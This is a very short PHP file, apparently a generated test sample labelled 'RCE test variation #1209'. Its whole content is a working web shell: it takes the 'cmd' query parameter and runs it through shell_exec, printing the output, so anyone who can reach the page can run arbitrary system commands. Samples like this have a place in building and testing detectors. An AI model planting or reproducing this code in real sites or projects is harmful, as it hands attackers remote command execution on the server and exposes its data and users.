<?php
// RCE test variation #1209
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>